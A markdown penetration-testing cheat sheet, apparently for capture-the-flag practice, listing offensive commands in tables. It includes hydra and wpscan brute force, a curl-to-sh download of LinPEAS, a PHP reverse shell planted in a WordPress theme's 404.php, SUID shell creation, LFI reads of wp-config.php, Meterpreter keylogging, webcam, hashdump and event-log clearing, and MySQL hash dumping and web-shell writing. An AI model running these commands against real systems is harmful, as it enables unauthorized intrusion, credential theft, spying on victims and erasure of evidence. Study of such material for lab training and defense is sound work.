# 72 97 99 107 105 110 103  78 111 116 101 115 
---

## Configuration Files & Tools

| Description             | Command        | Syntax                                                  |
|-------------------------|----------------|----------------------------------------------------------|
| Use VPN                 | openvpn        | `openvpn [FILE.ovpn]`                                   |
| TCP Nmap Scan (no ping) | nmap           | `nmap -Pn [IP]/[RANGE]`                                 |
| UDP Nmap Scan           | nmap           | `nmap -sU [IP]/[RANGE]`                                 |

## Directory Discovery with Gobuster

| Description             | Command                                                                 |
|-------------------------|-------------------------------------------------------------------------|
| Standard scan           | `gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirb/common.txt` |
| Using SOCKS5 proxy      | `gobuster dir -p socks5://[IP]:[PORT] --url http://[IP]/ -w common.txt`|

---

## Web & Content Discovery

| Description | Command     | Syntax                   |
|-------------|-------------|--------------------------|
| Robots.txt  | curl/browser| `http://[IP]/robots.txt` |

---

## File/Data Analysis

| Description     | Command | Syntax            |
|-----------------|---------|-------------------|
| Extract strings | strings | `strings [FILE]`  |

---

## WordPress Recon

| Description       | Examples/Paths                     |
|-------------------|------------------------------------|
| Backup/Swap Files | `[file].swp`, `.bak`, `.old`, etc. |

---

## Access

| Service    | Command Syntax                                |
|------------|------------------------------------------------|
| FTP        | `ftp [IP]`                                     |
| SSH        | `ssh [user]@[IP]`                              |
| SMB List   | `smbclient -L \\\\[IP]`                        |
| SMB Access | `smbclient \\\\[IP]\\[Share]`                  |

---

## Dictionary & Wordlist Generation

| Tool | Command                   | Syntax                         |
|------|---------------------------|--------------------------------|
| cewl | Generate custom wordlist  | `cewl [URL] > wordlist.txt`    |

---

## Bruteforce Attacks

| Tool     | Description                      | Syntax                                                                                     |
|----------|----------------------------------|--------------------------------------------------------------------------------------------|
| hydra    | HTTP form brute force            | `hydra -L [USERS] -P [PASSWORDS] [IP] -s [PORT] http-post-form "[url]:...:Invalid" -V`    |
| wpscan   | WordPress login brute force      | `wpscan --url [URL] -U [USER] -P [WORDLIST]`                                               |

---

## Privilege Escalation

| Task                    | Command / Path                                                |
|-------------------------|---------------------------------------------------------------|
| Download LinPEAS        | `curl [IP]:8000/linpeas.sh | sh`                              |
| Start HTTP server       | `python3 -m http.server 8000`                                |
| Start Netcat listener   | `nc -lvnp [PORT]`                                             |
| Spawn TTY shell         | `python3 -c 'import pty; pty.spawn("/bin/bash")'`             |
| Reverse shell (PHP)     | See code block below                                          |
| Find SUID exploit       | `find . -exec /bin/sh -p \; -quit`                            |
| Make binary SUID        | `chmod u+s /tmp/bash`                                         |

#### PHP Reverse Shell Example

```php
<?php
if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}
?>
```
Access at: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`

---

## Binary Exploits (Python)

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
```

---

## Escape Restricted Shell

| Method      | Command                                |
|-------------|-----------------------------------------|
| Vim escape  | `:!/bin/sh`<br>`:set shell=/bin/bash`<br>`:shell` |
| Tab check   | Press `TAB TAB` to list allowed commands |

---

## Process Snooping Without Root

| Tool     | Description               | Command/Source                                              |
|----------|---------------------------|--------------------------------------------------------------|
| pspy     | Monitor processes         | `./pspy64s` (from [pspy GitHub](https://github.com/DominicBreuker/pspy)) |

---

## Port Scanning One-Liner (Python)

```python
python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
```

---

## SSH Tunneling

| Task              | Syntax                                 |
|-------------------|----------------------------------------|
| Dynamic tunnel    | `ssh -D [PORT] [USER]@[IP]`            |

---

## Local File Inclusion - Base64 Read

| Task                | URL Example                                                                 |
|---------------------|------------------------------------------------------------------------------|
| Base64 encode read  | `http://[IP]/page=php://filter/convert.base64-encode/resource=wp-config.php` |

---

## Metasploit Basics

| Task                | Command                                   |
|---------------------|-------------------------------------------|
| Start               | `msfconsole`                              |
| Search modules      | `search <keyword>`                        |
| Load module         | `use <module_path>`                       |
| Show options        | `show options`                            |
| Set target IP       | `set RHOSTS <target-ip>`                  |
| Set local IP        | `set LHOST <your-ip>`                     |
| Set payload         | `set PAYLOAD <payload>`                   |
| Exploit             | `run` or `exploit`                        |
| List sessions       | `sessions`                                |
| Interact with session| `sessions -i <id>`                       |

## Meterpreter Commands

| Command               | Description                                      |
|-----------------------|--------------------------------------------------|
| `help`                | Show all available Meterpreter commands          |
| `sysinfo`             | Get target system information                    |
| `getuid`              | Display current user ID                          |
| `ipconfig`            | Show network interfaces of the victim            |
| `ifconfig`            | Same as above (alias)                            |
| `shell`               | Drop into a standard command shell               |
| `background`          | Send Meterpreter session to background           |
| `sessions`            | List all active sessions                         |
| `sessions -i [ID]`    | Interact with a specific session                 |
| `upload [src] [dst]`  | Upload file to the target                        |
| `download [src]`      | Download file from the target                    |
| `edit [file]`         | Open a file on target in an editor               |
| `cat [file]`          | Output contents of a file                        |
| `pwd`                 | Print working directory on the target            |
| `cd [dir]`            | Change directory on the target                   |
| `ls`                  | List files in the current directory              |
| `ps`                  | List running processes                           |
| `migrate [PID]`       | Migrate to another process (for stability)       |
| `getprivs`            | Enumerate current session privileges             |
| `use stdapi`          | Load standard API (if not loaded automatically)  |
| `keyscan_start`       | Start keylogger                                  |
| `keyscan_dump`        | Dump recorded keystrokes                         |
| `screenshot`          | Take a screenshot of the victim desktop          |
| `webcam_list`         | List available webcams                           |
| `webcam_snap`         | Take a snapshot using the webcam                 |
| `record_mic`          | Record microphone audio                          |
| `hashdump`            | Dump password hashes (if permissions allow)      |
| `clearev`             | Clear event logs on the target          

---

## MySQL Auxiliary Modules

- **auxiliary/scanner/mysql/mysql_version**  
  Connects to a MySQL server and retrieves its version banner. Useful to determine if the target is running a vulnerable version.

- **auxiliary/scanner/mysql/mysql_login**  
  Attempts to log in to MySQL using a supplied username/password (or a password list). Helps identify valid credentials.

- **auxiliary/admin/mysql/mysql_enum**  
  Gathers general MySQL information: users, databases, privileges, and version. Great for mapping out the target’s schema and user base.

- **auxiliary/admin/mysql/mysql_sql**  
  Allows you to run arbitrary SQL queries on the target once authenticated. Enables custom data extraction or manipulation.

- **auxiliary/scanner/mysql/mysql_file_enum**  
  Tries to enumerate files on the database host by exploiting MySQL’s `LOAD_FILE()` function. Can reveal configuration files, credentials, etc.

- **auxiliary/scanner/mysql/mysql_hashdump**  
  After authenticating, retrieves stored password hashes from the `mysql.user` table. These can then be cracked offline.

- **auxiliary/scanner/mysql/mysql_schemadump**  
  Connects and dumps schema metadata (tables, columns, types) across all databases. Builds a full picture of the database structure.

- **auxiliary/scanner/mysql/mysql_writable_dirs**  
  Enumerates directories on the MySQL server host where the `INTO OUTFILE` command is permitted. Useful for writing files (e.g., web shells) to disk.


## SMB Examples

| Task              | Command                                  |
|-------------------|-------------------------------------------|
| List shares       | `smbclient -L \\\\[IP]`                   |
| Access share      | `smbclient \\\\[IP]\\[Share]`             |
| Use with proxy    | `proxychains smbclient \\\\[IP]\\[Share]` |

---

## Cleanup and File Checks

| Task                        | Command                            |
|-----------------------------|-------------------------------------|
| Find passwords              | `grep -i password /etc/* 2>/dev/null` |
| Check crontab               | `crontab -l`                        |
| Inspect logout script       | `vim ~/.bash_logout`               |
| Inspect user config         | `vim ~/.config/`                   |

